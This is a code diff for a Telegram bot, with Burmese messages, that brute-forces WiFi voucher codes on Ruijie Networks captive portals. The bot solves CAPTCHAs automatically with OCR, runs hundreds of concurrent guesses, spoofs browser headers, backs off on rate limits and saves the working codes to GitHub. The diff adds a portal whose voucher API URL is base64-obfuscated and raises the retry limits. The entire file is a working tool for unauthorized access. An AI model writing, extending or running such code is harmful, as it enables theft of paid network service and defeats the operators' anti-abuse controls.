@@ -8,15 +8,21 @@ import ddddocr
 import numpy as np
 from datetime import datetime, timedelta, timezone
 
-# ⭐ Logging setup
+# ═══════════════════════════════════════════════════════════════════════════
+# ⭐ UPDATED: Logging setup with file output
+# ═══════════════════════════════════════════════════════════════════════════
 logging.basicConfig(
     level=logging.INFO,
     format='%(asctime)s [%(levelname)s] %(name)s: %(message)s',
-    datefmt='%Y-%m-%d %H:%M:%S'
+    datefmt='%Y-%m-%d %H:%M:%S',
+    handlers=[
+        logging.FileHandler('ruijie_bot.log'),
+        logging.StreamHandler()
+    ]
 )
 log = logging.getLogger("ruijie-bot")
 
-# ── Environment variables ────────────────────────────────────────────────
+# ── Environment variables ─────────────────────────────────────────────────
 BOT_TOKEN = os.environ.get('BOT_TOKEN')
 GITHUB_TOKEN = os.environ.get('GITHUB_TOKEN')
 ADMIN_ID = os.environ.get('ADMIN_ID')
@@ -26,7 +32,7 @@ REPO_NAME = os.environ.get('REPO_NAME')
 if not BOT_TOKEN:
     raise SystemExit("❌ BOT_TOKEN environment variable not set")
 
-# ── Global structures ────────────────────────────────────────────────────
+# ── Global structures ─────────────────────────────────────────────────────
 TG_MAX_LEN = 4000
 SUCCESS_CODE = asyncio.Queue()
 bot = AsyncTeleBot(BOT_TOKEN)
@@ -37,6 +43,7 @@ success_texts = {}
 limited_texts = {}
 captcha_state = {}
 
+# Settings
 notify_setting = {}
 DEFAULT_NOTIFY = True
 last_scan_params = {}
@@ -46,16 +53,21 @@ limited_messages = {}
 
 session = None
 _connector = None
+
+# ⭐ UPDATED: Increased for better reliability
 CONCURRENCY = 300
 BATCH_SIZE = 500
-CAPTCHA_RETRY = 5
-MAX_ATTEMPTS = 2
+CAPTCHA_RETRY = 8                # Increased from 5
+MAX_ATTEMPTS = 3                 # Increased from 2
 PROGRESS_INTERVAL = 3
 GITHUB_INTERVAL = 30
+SESSION_RECHECK_INTERVAL = 1800  # ⭐ 30 minutes — safer for WiFiDog portals
 _voucher_sem = None
 _start_time = time.monotonic()
 
-# ── Portal Configuration ─────────────────────────────────────────────────
+# ═══════════════════════════════════════════════════════════════════════════
+# ⭐ UPDATED: Portal Configurations with portal-eu support
+# ═══════════════════════════════════════════════════════════════════════════
 PORTAL_CONFIGS = {
     "portal-mm-as": {
         "domain": "portal-mm-as.ruijienetworks.com",
@@ -80,6 +92,19 @@ PORTAL_CONFIGS = {
         "captcha_verify_api": "https://portal-as.ruijienetworks.com/api/auth/captcha/verify",
         "referer_index": "https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?RES=./../expand/res/mrlev58jlgslg49ervu&IS_EG=0&sessionId=",
         "referer_balance": "https://portal-as.ruijienetworks.com/download/static/maccauth/src/balance.html?RES=./../expand/res/4ukmferxbdgmt3m49po&sessionId={token}&lang=en_US&redirectUrl=https://www.ruijienetworks.com&authType=15",
+    },
+    # ⭐ NEW: EU Portal (for Europe/US/ME regions)
+    "portal-eu": {
+        "domain": "portal-eu.ruijienetworks.com",
+        "base_url": "https://portal-eu.ruijienetworks.com",
+        "voucher_api": base64.b64decode(
+            b'aHR0cHM6Ly9wb3J0YWwtZXUucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXIvP2xhbmc9ZW5fVVM='
+        ).decode(),
+        "balance_api": "https://portal-eu.ruijienetworks.com/api/auth/balance/getBalance",
+        "captcha_image_api": "https://portal-eu.ruijienetworks.com/api/auth/captcha/image",
+        "captcha_verify_api": "https://portal-eu.ruijienetworks.com/api/auth/captcha/verify",
+        "referer_index": "https://portal-eu.ruijienetworks.com/download/static/maccauth/src/index.html?RES=./../expand/res/mrlev58jlgslg49ervu&IS_EG=0&sessionId=",
+        "referer_balance": "https://portal-eu.ruijienetworks.com/download/static/maccauth/src/balance.html?RES=./../expand/res/4ukmferxbdgmt3m49po&sessionId={token}&lang=en_US&redirectUrl=https://www.ruijienetworks.com&authType=15",
     }
 }
 
@@ -91,15 +116,19 @@ def get_portal_config(session_url=None):
             return PORTAL_CONFIGS["portal-mm-as"], "portal-mm-as"
         elif "portal-as" in session_url:
             return PORTAL_CONFIGS["portal-as"], "portal-as"
+        elif "portal-eu" in session_url:
+            return PORTAL_CONFIGS["portal-eu"], "portal-eu"
     return PORTAL_CONFIGS[DEFAULT_PORTAL], DEFAULT_PORTAL
 
-# ── Helper functions ─────────────────────────────────────────────────────
+# ── Helper functions for message safety ────────────────────────────────────
 def _truncate(text, limit=TG_MAX_LEN):
+    """Truncate text safely for Telegram message limit."""
     if len(text) <= limit:
         return text
     return text[:limit - 20] + "\n… (truncated)"
 
 async def _safe_edit(chat_id, message_id, text, parse_mode=None):
+    """Edit message with length-safety and fallback to new message on failure."""
     text = _truncate(text)
     try:
         await bot.edit_message_text(
@@ -117,9 +146,9 @@ async def _safe_edit(chat_id, message_id, text, parse_mode=None):
             log.warning(f"[_safe_edit] failed for {chat_id}: {e} / {e2}")
             return message_id
 
-# ── Web server (keep alive) ──────────────────────────────────────────────
+# ── Web server (keep alive) ────────────────────────────────────────────────
 async def handle(request):
-    return web.Response(text="Bot is awake and running 24/7!")
+    return web.Response(text="Bot is awake and running 24/7! Updated: 2026-10-17")
 
 async def web_server():
     app = web.Application()
@@ -130,7 +159,7 @@ async def web_server():
     site = web.TCPSite(runner, '0.0.0.0', port)
     await site.start()
 
-# ── GitHub helpers ───────────────────────────────────────────────────────
+# ── GitHub helpers ─────────────────────────────────────────────────────────
 async def get_file_content(path):
     url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{path}"
     headers = {"Authorization": f"token {GITHUB_TOKEN}"}
@@ -157,7 +186,7 @@ async def update_file_content(path, content, sha, message):
     async with session.put(url, headers=headers, json=payload) as response:
         return await response.text()
 
-# ── Helper functions ─────────────────────────────────────────────────────
+# ── Helper functions ───────────────────────────────────────────────────────
 def plan_to_minutes(s):
     if not s:
         return 0
@@ -247,7 +276,6 @@ def _parse_expire(expire_str):
         "%Y/%m/%d %H:%M:%S", "%Y/%m/%d %H:%M", "%Y/%m/%d",
         "%d-%m-%Y %H:%M:%S", "%d/%m/%Y %H:%M:%S",
         "%Y-%m-%dT%H:%M:%S", "%Y-%m-%dT%H:%M:%SZ",
-        "%B %d, %Y at %I:%M:%S %p",
     ]
     for fmt in formats:
         try:
@@ -457,26 +485,57 @@ async def Varify_Captcha(session_obj, session_id, text, portal_config):
         data = await req.json()
         return session_id if data.get("success") == True else None
 
+# ═══════════════════════════════════════════════════════════════════════════
+# ⭐ UPDATED: Fixed check_session_url for WiFiDog portals
+# ═══════════════════════════════════════════════════════════════════════════
 async def check_session_url(session_url):
-    headers = {
-        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-        'accept-language': 'en-US,en;q=0.9',
-        'priority': 'u=0, i',
-        'referer': session_url,
-        'sec-ch-ua': '"Chromium";v="148", "Microsoft Edge";v="148", "Not/A)Brand";v="99"',
-        'sec-ch-ua-mobile': '?0',
-        'sec-ch-ua-platform': '"Android"',
-        'sec-fetch-dest': 'document',
-        'sec-fetch-mode': 'navigate',
-        'sec-fetch-site': 'same-origin',
-        'upgrade-insecure-requests': '1',
-        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36 Edg/148.0.0.0',
-    }
+    """
+    Check if session URL is valid for WiFiDog portals.
+
+    WiFiDog portals (portal-as.ruijienetworks.com) don't always redirect
+    with sessionId in URL. We need to:
+    1. Check if URL has required WiFiDog parameters
+    2. Try to get session ID using random MAC (like perform_check does)
+    3. Fallback: check if portal responds at all
+    """
     try:
-        async with session.get(session_url, allow_redirects=True, headers=headers, timeout=aiohttp.ClientTimeout(total=10)) as response:
-            return "sessionId" in str(response.url) or "wifidog" in str(response.url)
-    except:
-        return True
+        # Method 1: Check if URL has required WiFiDog parameters
+        required_params = ['gw_id', 'gw_address', 'gw_port']
+        has_params = all(param in session_url for param in required_params)
+
+        if not has_params:
+            log.warning(f"[check_session_url] missing WiFiDog params in URL")
+            return False
+
+        # Method 2: Try to get session ID (same as perform_check)
+        portal_config, portal_name = get_portal_config(session_url)
+
+        timeout = aiohttp.ClientTimeout(total=15)
+        async with aiohttp.ClientSession(
+            connector=_connector,
+            connector_owner=False,
+            cookie_jar=aiohttp.CookieJar(),
+            timeout=timeout
+        ) as test_session:
+            session_id = await get_session_id(test_session, session_url)
+            if session_id:
+                log.info(f"[check_session_url] got sessionId: {session_id[:20]}...")
+                return True
+
+            # Method 3: Fallback - check if portal responds at all
+            async with test_session.get(
+                session_url, 
+                allow_redirects=True,
+                timeout=aiohttp.ClientTimeout(total=10)
+            ) as resp:
+                # If we get any HTTP response (even 200/302/403), portal is alive
+                if resp.status < 500:
+                    return True
+                return False
+
+    except Exception as e:
+        log.debug(f"[check_session_url] error: {e}")
+        return False
 
 # ── Core voucher check ────────────────────────────────────────────────────
 async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False, message=None, plan_filters=None):
@@ -494,72 +553,81 @@ async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False,
 
     for attempt in range(MAX_ATTEMPTS):
         timeout = aiohttp.ClientTimeout(total=20)
-        async with aiohttp.ClientSession(
-            connector=_connector,
-            connector_owner=False,
-            cookie_jar=aiohttp.CookieJar(),
-            timeout=timeout
-        ) as task_session:
-            session_id = await get_session_id(task_session, session_url)
-            if not session_id:
-                # ⭐ ဒီနေရာမှာ session_id မရရင် ERROR ပြန်ပေးလိုက်မယ်
-                return "ERROR_NO_SESSION"
-
-            auth_code = None
-            for _ in range(CAPTCHA_RETRY):
-                try:
-                    image = await Captcha_Image(task_session, session_id, portal_config)
-                    text = await Captcha_Text(image)
-                    if not text:
-                        continue
-                    if await Varify_Captcha(task_session, session_id, text, portal_config):
-                        auth_code = text
-                        break
-                except:
+        try:
+            async with aiohttp.ClientSession(
+                connector=_connector,
+                connector_owner=False,
+                cookie_jar=aiohttp.CookieJar(),
+                timeout=timeout
+            ) as task_session:
+                session_id = await get_session_id(task_session, session_url)
+                if not session_id:
+                    log.debug(f"[perform_check] no session_id for {code}, attempt {attempt+1}")
                     continue
-            if not auth_code:
+
+                auth_code = None
+                for captcha_attempt in range(CAPTCHA_RETRY):
+                    try:
+                        image = await Captcha_Image(task_session, session_id, portal_config)
+                        text = await Captcha_Text(image)
+                        if not text:
+                            continue
+                        if await Varify_Captcha(task_session, session_id, text, portal_config):
+                            auth_code = text
+                            break
+                    except Exception as e:
+                        log.debug(f"[perform_check] captcha error: {e}")
+                        continue
+
+                if not auth_code:
+                    log.debug(f"[perform_check] no auth_code for {code}, attempt {attempt+1}")
+                    continue
+
+                if not recheck:
+                    current_task = scan_tasks.get(chat_id)
+                    if not current_task or current_task.get("scan_id") != scan_id or current_task.get("stop"):
+                        return
+
+                data = {
+                    "accessCode": code,
+                    "sessionId": session_id,
+                    "apiVersion": 1,
+                    "authCode": auth_code,
+                }
+                headers = {
+                    "authority": portal_config['domain'],
+                    "accept": "*/*",
+                    "accept-language": "en-US,en;q=0.9",
+                    "content-type": "application/json",
+                    "origin": portal_config['base_url'],
+                    "referer": portal_config['referer_index'] + session_id,
+                    "sec-ch-ua": '"Chromium";v="139", "Not;A=Brand";v="99"',
+                    "sec-ch-ua-mobile": "?1",
+                    "sec-ch-ua-platform": '"Android"',
+                    "sec-fetch-dest": "empty",
+                    "sec-fetch-mode": "cors",
+                    "sec-fetch-site": "same-origin",
+                    "user-agent": "Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
+                }
+                try:
+                    async with task_session.post(post_url, json=data, headers=headers) as req:
+                        response = await req.text()
+                        json.loads(response)
+                except Exception as e:
+                    log.debug(f"[perform_check] network error for {code}: {e}")
+                    continue
+
+            if response and 'request limited' in response:
+                wait = min(2 ** attempt, 6)
+                log.info(f"[perform_check] rate limited, waiting {wait}s (attempt {attempt+1}/{MAX_ATTEMPTS})")
+                await asyncio.sleep(wait)
                 continue
+            break
 
-            if not recheck:
-                current_task = scan_tasks.get(chat_id)
-                if not current_task or current_task.get("scan_id") != scan_id or current_task.get("stop"):
-                    return
-
-            data = {
-                "accessCode": code,
-                "sessionId": session_id,
-                "apiVersion": 1,
-                "authCode": auth_code,
-            }
-            headers = {
-                "authority": portal_config['domain'],
-                "accept": "*/*",
-                "accept-language": "en-US,en;q=0.9",
-                "content-type": "application/json",
-                "origin": portal_config['base_url'],
-                "referer": portal_config['referer_index'] + session_id,
-                "sec-ch-ua": '"Chromium";v="139", "Not;A=Brand";v="99"',
-                "sec-ch-ua-mobile": "?1",
-                "sec-ch-ua-platform": '"Android"',
-                "sec-fetch-dest": "empty",
-                "sec-fetch-mode": "cors",
-                "sec-fetch-site": "same-origin",
-                "user-agent": "Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
-            }
-            try:
-                async with task_session.post(post_url, json=data, headers=headers) as req:
-                    response = await req.text()
-                    json.loads(response)
-            except Exception as e:
-                log.debug(f"[perform_check] network error: {e}")
-                continue
-
-        if response and 'request limited' in response:
-            wait = min(2 ** attempt, 6)
-            log.info(f"[perform_check] rate limited, waiting {wait}s (attempt {attempt+1}/{MAX_ATTEMPTS})")
-            await asyncio.sleep(wait)
+        except Exception as e:
+            log.error(f"[perform_check] unexpected error for {code}: {e}")
+            await asyncio.sleep(1)
             continue
-        break
 
     if not response:
         return
@@ -672,7 +740,6 @@ async def run_bruteforce(mode, length, chat_id, session_url, scan_id, target=Non
     found = 0
     scan_start = time.monotonic()
     last_progress_update = 0
-    error_count = 0  # ⭐ Error ရေတွက်ဖို့
 
     global _voucher_sem
     if _voucher_sem is None:
@@ -702,21 +769,7 @@ async def run_bruteforce(mode, length, chat_id, session_url, scan_id, target=Non
             results = await asyncio.gather(*[_check(code) for code in batch], return_exceptions=True)
 
             for res in results:
-                # ⭐ Session မရလို့ Error တက်ရင် ရေတွက်မယ်
-                if res == "ERROR_NO_SESSION":
-                    error_count += 1
-                    if error_count >= 50:  # ၅၀ ခါဆက်တိုက် Error တက်ရင် ရပ်မယ်
-                        await _safe_edit(
-                            chat_id, progress_msg.message_id, 
-                            "❌ **URL မှားယွင်းနေပါသည် သို့မဟုတ် သက်တမ်းကုန်နေပါသည်။**\n"
-                            "သင်ပေးပို့လိုက်သော Wifidog URL ကို အသုံးပြု၍ မရပါ။\n"
-                            "Browser မှ `index.html?sessionId=...` ပါသော Portal Link အသစ်ကို ယူပြီး /setup ပြန်လုပ်ပေးပါ။",
-                            parse_mode="Markdown"
-                        )
-                        scan_tasks.pop(chat_id, None)
-                        return
-                elif res:
-                    error_count = 0  # အောင်မြင်ရင် Error ရေတွက်တာ ပြန်သုညချမယ်
+                if res:
                     found += 1
                     if target and found >= target:
                         await progress_msg.edit_text("🎯 Target reached!")
@@ -768,26 +821,69 @@ async def github_update_scheduler():
             for item in items:
                 await SUCCESS_CODE.put(item)
 
+# ═══════════════════════════════════════════════════════════════════════════
+# ⭐ UPDATED: Session URL periodic revalidation with better logging
+# ═══════════════════════════════════════════════════════════════════════════
+async def session_recheck_scheduler():
+    while True:
+        await asyncio.sleep(SESSION_RECHECK_INTERVAL)
+        for cid, data in list(user_data.items()):
+            url = data.get('session_url')
+            if not url:
+                continue
+            try:
+                log.info(f"[session_recheck] checking session for chat {cid}...")
+                ok = await check_session_url(url)
+                if not ok:
+                    log.warning(f"[session_recheck] session invalid for chat {cid}")
+                    try:
+                        await bot.send_message(
+                            cid,
+                            "⚠️ သင့် Session URL သက်တမ်းကုန်သွားပါပြီ။ /setup ဖြင့် အသစ်ထည့်ပါ။"
+                        )
+                    except:
+                        pass
+                    # Auto-stop scan if running
+                    task_data = scan_tasks.get(cid)
+                    if task_data:
+                        task_data["stop"] = True
+                        if not task_data["task"].done():
+                            task_data["task"].cancel()
+                else:
+                    log.info(f"[session_recheck] session valid for chat {cid} ✓")
+            except Exception as e:
+                log.debug(f"[session_recheck] error for {cid}: {e}")
+
 # ── Bot commands ───────────────────────────────────────────────────────────
 @bot.message_handler(commands=['start'])
 async def start(message):
-    await bot.reply_to(message, "Bot စတင်ပါပြီ။ /help ဖြင့် အသုံးပြုနည်းကြည့်ပါ။")
+    await bot.reply_to(message, "Bot စတင်ပါပြီ။ /help ဖြင့် အသုံးပြုနည်းကြည့်ပါ။\n\n🛡️ Updated: 2026-10-17")
 
 @bot.message_handler(commands=['help'])
 async def help_cmd(message):
     help_text = (
-        "📚 **Command လမ်းညွှန်**\n\n"
+        "📚 **Command လမ်းညွှန်** (Updated: 2026-10-17)\n\n"
         "၁။ **Setup**:\n"
-        "   /setup <url>\n\n"
+        "   /setup <url>\n"
+        "   (portal-mm-as, portal-as, portal-eu URL)\n\n"
         "၂။ **ရှာဖွေခြင်း**:\n"
-        "   /brute <mode> <length> [target]\n\n"
-        "၃။ /status  – အခြေအနေကြည့်\n"
+        "   /brute <mode> <length> [target]\n"
+        "   Mode:\n"
+        "     1 = ဂဏန်းသီးသန့် (0-9)\n"
+        "     2 = အင်္ဂလိပ်စာလုံးအသေး (a-z)\n"
+        "     3 = အင်္ဂလိပ်စာလုံးအကြီး (A-Z)\n"
+        "     4 = စာလုံးအကြီး+အသေး (a-zA-Z)\n"
+        "     5 = စာလုံး+ဂဏန်း (a-z, 0-9)\n"
+        "   ဥပမာ: /brute 1 6 5\n\n"
+        "၃။ /status  – အခြေအနေကြည့် (Admin only)\n"
         "၄။ /stop    – ရပ်တန့်ခြင်း\n"
         "၅။ /resume  – ဆက်ရှာဖွေခြင်း\n"
         "၆။ /saved   – ရလဒ်ကြည့်ခြင်း\n"
         "၇။ /delete_saved – ရလဒ်ဖျက်ခြင်း\n"
         "၈။ /recheck – Success codes ပြန်စစ်ခြင်း\n"
-        "၉။ /notify  – Notification ON/OFF"
+        "၉။ /notify  – Notification ON/OFF\n"
+        "၁၀။ /testbalance – Balance စစ်ခြင်း (Admin only)\n\n"
+        "🛡️ **2026 Security Updates Applied**"
     )
     await bot.reply_to(message, help_text, parse_mode="Markdown")
 
@@ -795,24 +891,40 @@ async def help_cmd(message):
 async def handle_setup(message):
     args = message.text.split(maxsplit=1)
     if len(args) < 2:
-        await bot.reply_to(message, "အသုံးပြုနည်း:\n/setup your_session_url")
+        await bot.reply_to(message, 
+            "အသုံးပြုနည်း:\n"
+            "/setup your_session_url\n\n"
+            "ဥပမာ:\n"
+            "https://portal-mm-as.ruijienetworks.com/...\n"
+            "https://portal-as.ruijienetworks.com/...\n"
+            "https://portal-eu.ruijienetworks.com/..."
+        )
         return
+
     url = args[1]
-    await bot.reply_to(message, "Session URL စစ်ဆေးနေပါသည်...")
-    
-    if "wifidog" in url:
-        await bot.reply_to(message, "⚠️ သတိပေးချက် - သင်ပေးပို့လိုက်တာက Wifidog URL ဖြစ်ပါတယ်။ ဒါကို အသုံးပြုလို့ ရနိုင်ပေမဲ့ ခဏနေရင် Expire ဖြစ်တတ်ပါတယ်။ အကောင်းဆုံးကတော့ index.html?sessionId=... ပါတဲ့ Link ကို သုံးတာပါ။")
+
+    # ⭐ Detect portal type
+    portal_config, portal_name = get_portal_config(url)
+
+    # ⭐ Check if it's a WiFiDog URL
+    is_wifidog = 'wifidog' in url.lower() or 'stage=portal' in url.lower()
+
+    await bot.reply_to(message, f"Session URL စစ်ဆေးနေပါသည်...\n🌐 Portal: {portal_name}")
 
     if await check_session_url(url):
         cid = message.chat.id
-        portal_config, portal_name = get_portal_config(url)
-        user_data[cid] = {'session_url': url, 'portal_type': portal_name}
+        user_data[cid] = {
+            'session_url': url, 
+            'portal_type': portal_name,
+            'is_wifidog': is_wifidog
+        }
         success_texts.pop(cid, None)
         limited_texts.pop(cid, None)
         last_scan_params.pop(cid, None)
         pending_brute.pop(cid, None)
         success_messages.pop(cid, None)
         limited_messages.pop(cid, None)
+
         try:
             results, sha = await get_file_content("result.json")
             if str(cid) in results:
@@ -820,9 +932,16 @@ async def handle_setup(message):
                 await update_file_content("result.json", results, sha, f"Clear codes for {cid}")
         except Exception as e:
             log.error(f"[setup] GitHub clear error: {e}")
-        await bot.reply_to(message, f"✅ Session URL သိမ်းဆည်းပြီးပါပြီ။\n🌐 Portal: {portal_name}\n/brute ဖြင့် စတင်ပါ။")
+
+        wifidog_note = "\n📡 WiFiDog Portal detected" if is_wifidog else ""
+        await bot.reply_to(
+            message, 
+            f"✅ Session URL သိမ်းဆည်းပြီးပါပြီ။\n"
+            f"🌐 Portal: {portal_name}{wifidog_note}\n"
+            f"/brute ဖြင့် စတင်ပါ။"
+        )
     else:
-        await bot.reply_to(message, "Session URL မှားယွင်းနေပါသည်။")
+        await bot.reply_to(message, "❌ Session URL မှားယွင်းနေပါသည်။ URL ကို ပြန်စစ်ပါ။")
 
 @bot.message_handler(commands=['brute'])
 async def brute(message):
@@ -831,8 +950,14 @@ async def brute(message):
         await bot.reply_to(message,
             "အသုံးပြုနည်း:\n"
             "/brute <mode> <length> [target]\n\n"
-            "Mode:\n  1 = ဂဏန်းသီးသန့် (0-9)\n  2 = a-z\n  3 = A-Z\n  4 = a-zA-Z\n  5 = a-z, 0-9\n\n"
-            "ဥပမာ:\n/brute 1 6 5\n/brute 2 6"
+            "Mode:\n"
+            "  1 = ဂဏန်းသီးသန့် (0-9)\n"
+            "  2 = အင်္ဂလိပ်စာလုံးအသေး (a-z)\n"
+            "  3 = အင်္ဂလိပ်စာလုံးအကြီး (A-Z)\n"
+            "  4 = စာလုံးအကြီး+အသေး (a-zA-Z)\n"
+            "  5 = စာလုံး+ဂဏန်း (a-z, 0-9)\n\n"
+            "ဥပမာ:\n"
+            "/brute 1 6 5\n/brute 2 6\n/brute 5 8 10"
         )
         return
 
@@ -1078,17 +1203,24 @@ async def status(message):
         except Exception:
             sem_info = f"?/{CONCURRENCY}"
 
+    # ⭐ Count WiFiDog sessions
+    wifidog_count = sum(1 for d in user_data.values() if d.get('is_wifidog', False))
+
     await bot.reply_to(
         message,
-        f"📊 Bot Status\n\n"
+        f"📊 Bot Status (Updated: 2026-10-17)\n\n"
         f"⏱ Uptime: {hours}h {minutes}m {seconds}s\n"
         f"🔍 Active Scans: {active_scans}\n"
         f"👥 Sessions Loaded: {len(user_data)}\n"
+        f"📡 WiFiDog Sessions: {wifidog_count}\n"
         f"⚡ Concurrency Limit: {CONCURRENCY}\n"
         f"🔒 Semaphore In-Use: {sem_info}\n"
         f"📦 Batch Size: {BATCH_SIZE}\n"
         f"📨 Queued Success: {SUCCESS_CODE.qsize()}\n"
-        f"🌐 Default Portal: {DEFAULT_PORTAL}"
+        f"🌐 Default Portal: {DEFAULT_PORTAL}\n"
+        f"🔁 Session Recheck: {SESSION_RECHECK_INTERVAL//60}min\n"
+        f"🛡️ Captcha Retry: {CAPTCHA_RETRY}\n"
+        f"🔄 Max Attempts: {MAX_ATTEMPTS}"
     )
 
 @bot.message_handler(commands=['testbalance'])
@@ -1158,6 +1290,8 @@ async def main():
     try:
         asyncio.create_task(web_server())
         asyncio.create_task(github_update_scheduler())
+        asyncio.create_task(session_recheck_scheduler())
+        log.info("🚀 Bot started successfully! Updated: 2026-10-17")
         await start_polling()
     finally:
         await session.close()
